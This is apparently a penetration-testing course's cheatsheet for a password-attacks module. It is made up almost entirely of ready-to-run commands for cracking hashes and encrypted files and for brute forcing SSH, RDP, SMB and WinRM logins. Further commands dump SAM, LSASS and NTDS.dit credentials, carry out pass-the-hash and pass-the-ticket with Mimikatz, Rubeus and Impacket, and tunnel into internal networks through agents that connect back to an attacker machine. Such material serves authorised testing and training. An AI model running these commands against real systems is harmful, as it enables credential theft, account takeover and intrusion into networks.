---
title: Module 4 - Password Attacks
tags: [password-attacks, cheatsheet, hashcat, john, credentials, mimikatz, pass-the-hash, pass-the-ticket, pivoting]
---

# Module 4 - Password Attacks

> Attacking and bypassing authentication by compromising passwords across operating systems, applications, and encryption methods.

## Key Commands

### Password Cracking

```bash
# John the Ripper
john --wordlist=rockyou.txt hash.txt
john --incremental hash.txt
john --single passwd

# Hashcat
hashcat -a 0 -m 1000 hashes.txt rockyou.txt              # NTLM dictionary
hashcat -a 0 -m 0 hash.txt rockyou.txt -r best64.rule    # with rules
hashcat -a 3 -m 0 hash.txt '?u?l?l?l?l?d?s'             # mask attack

# Identify hashes
hashid -j <hash>
hashid -m <hash>
```

### File/Archive Cracking

```bash
ssh2john.py SSH.private > ssh.hash && john --wordlist=rockyou.txt ssh.hash
office2john.py file.docx > file.hash && john --wordlist=rockyou.txt file.hash
pdf2john.py file.pdf > file.hash && john --wordlist=rockyou.txt file.hash
zip2john file.zip > zip.hash && john --wordlist=rockyou.txt zip.hash
bitlocker2john -i drive.vhd > drive.hashes
hashcat -a 0 -m 22100 '<bitlocker_hash>' rockyou.txt
```

### Network Services

```bash
netexec winrm <IP> -u users.txt -p passwords.txt
netexec smb <IP> -u users.txt -p passwords.txt
hydra -L users.txt -P passwords.txt ssh://<IP>
hydra -L users.txt -P passwords.txt rdp://<IP>
hydra -L users.txt -P passwords.txt smb://<IP>
evil-winrm -i <IP> -u <user> -p <pass>
```

### SAM / SYSTEM / LSASS

```bash
# Save registry hives
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

# Dump hashes (offline)
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# LSASS dump → extract
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
pypykatz lsa minidump lsass.dmp

# Remote dump
netexec smb <IP> --local-auth -u <user> -p <pass> --sam
netexec smb <IP> --local-auth -u <user> -p <pass> --lsa
```

### Active Directory / NTDS

```bash
kerbrute userenum --dc <IP> --domain <domain> users.txt
netexec smb <DC-IP> -u <user> -p wordlist.txt              # brute force
evil-winrm -i <DC-IP> -u <user> -p <pass>
vssadmin CREATE SHADOW /For=C:                             # VSS on DC
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
netexec smb <IP> -u <user> -p <pass> -M ntdsutil
```

### Pass the Hash

```bash
# Mimikatz (Windows)
mimikatz # sekurlsa::pth /user:<user> /rc4:<hash> /domain:<domain> /run:cmd.exe

# Impacket (Linux)
impacket-psexec administrator@<IP> -hashes :<hash>
netexec smb <IP> -u Administrator -d . -H <hash>
evil-winrm -i <IP> -u Administrator -H <hash>
xfreerdp /v:<IP> /u:<user> /pth:<hash>
```

### Pass the Ticket

```bash
# Export tickets
mimikatz # sekurlsa::tickets /export
Rubeus.exe dump /nowrap

# OverPass the Hash → TGT
mimikatz # sekurlsa::ekeys
Rubeus.exe asktgt /domain:<domain> /user:<user> /aes256:<key> /nowrap

# Pass the ticket
Rubeus.exe ptt /ticket:<base64 or .kirbi>
mimikatz # kerberos::ptt "<path\to\ticket.kirbi>"

# Linux PtT (ccache)
export KRB5CCNAME=/tmp/krb5cc_<id>
proxychains impacket-wmiexec dc01 -k
```

### Pivoting

```bash
# SSH SOCKS proxy
ssh -D 1080 -N user@<pivot>
# proxychains.conf: socks5 127.0.0.1 1080
proxychains nmap -sT <target>

# Chisel (reverse SOCKS)
chisel server -p 8000 --reverse                             # Kali
chisel.exe client <kali>:8000 R:1080:socks                 # Pivot

# Ligolo-ng
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
ligolo-ng -selfcert -laddr 0.0.0.0:11601
agent.exe -connect <kali>:11601 -ignore-cert
sudo ip route add <internal-subnet>/24 dev ligolo
```

---

## Module Pages

| Topic | File |
|-------|------|
| Password Cracking (JtR & Hashcat) | [password-cracking.md](password-cracking.md) |
| Cracking Files & Archives | [cracking-files-archives.md](cracking-files-archives.md) |
| Network Services | [network-services.md](network-services.md) |
| Windows Credentials (SAM/LSASS/Credential Manager) | [windows-credentials.md](windows-credentials.md) |
| Active Directory & NTDS.dit | [active-directory.md](active-directory.md) |
| Credential Hunting | [credential-hunting.md](credential-hunting.md) |
| Pass the Hash | [pass-the-hash.md](pass-the-hash.md) |
| Pass the Ticket | [pass-the-ticket.md](pass-the-ticket.md) |
| Pivoting | [pivoting.md](pivoting.md) |
